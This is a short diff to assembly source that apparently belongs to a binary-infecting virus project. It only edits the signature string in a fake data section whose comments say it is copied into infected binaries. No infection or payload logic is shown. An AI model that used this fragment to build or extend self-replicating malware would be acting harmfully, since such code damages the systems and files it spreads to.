@@ -503,7 +503,7 @@ magic_key: db 0x00					; Will be replaced by a script
 magic_key_size: equ $ - magic_key
 ; never used but here to be copied in the binary
 clean: db 0x0
-signature: db "Death v1.0 by jmaia and dhubleur - "
+signature: db "D34TH v1.0 by jmaia and dhubleur - "
 fingerprint_str: db "0000000000", 0
 fingerprint_int: dd 0
 ; END FAKE .data SECTION
